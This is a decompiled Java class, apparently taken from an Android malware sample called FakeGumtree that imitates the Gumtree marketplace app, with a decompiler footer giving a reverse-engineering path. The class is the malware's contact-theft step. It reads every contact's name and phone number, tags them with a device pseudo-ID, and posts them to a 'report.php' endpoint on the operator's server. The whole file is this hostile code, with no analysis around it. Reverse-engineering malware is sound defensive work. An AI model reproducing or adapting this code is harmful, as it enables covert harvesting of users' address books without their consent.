package com.gumsis.srs.api.requests;

import android.content.Context;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HttpRequest;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.api.tls.TxtTls;
import com.gumsis.cntcts.Contact;
import com.gumsis.srs.api.responses.StatusResponse;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class RegistrationReportStep6Request
  extends HttpRequest
{
  private static final String LOG_TAG = "REALTALK REQUEST";
  private static final String PATH = "report.php";
  private List<Contact> mContactList;
  private HttpResponseHandler<HttpResponse> mResponseHandlerHandler;
  
  public RegistrationReportStep6Request(Context paramContext, List<Contact> paramList, HttpResponseHandler<HttpResponse> paramHttpResponseHandler)
  {
    super(paramContext, "report.php", 18);
    try
    {
      this.mContactList = paramList;
      this.data = TxtTls.getBytesUTF8(getHttpParams(paramContext));
      this.mResponseHandlerHandler = paramHttpResponseHandler;
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  protected String getHttpParams(Context paramContext)
    throws Exception
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONObject localJSONObject2 = new JSONObject();
    localJSONObject1.put("report", "contacts");
    localJSONObject1.put("id", Realtalk.getPsuedoID(paramContext));
    paramContext = new JSONArray();
    Iterator localIterator = this.mContactList.iterator();
    while (localIterator.hasNext())
    {
      Contact localContact = (Contact)localIterator.next();
      JSONObject localJSONObject3 = new JSONObject();
      localJSONObject3.put("name", localContact.name);
      localJSONObject3.put("number", localContact.phoneNumber);
      paramContext.put(localJSONObject3);
    }
    localJSONObject1.put("objects", paramContext);
    localJSONObject2.put("1", localJSONObject1);
    return TxtTls.getPostParamsUTF8(localJSONObject2);
  }
  
  public String getUrl()
  {
    return getBaseUrl();
  }
  
  protected void onRequestFailure(int paramInt, String paramString)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseFailureResponse(paramInt, paramString);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
  
  protected void onRequestSuccess(JSONObject paramJSONObject)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/api/requests/RegistrationReportStep6Request.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */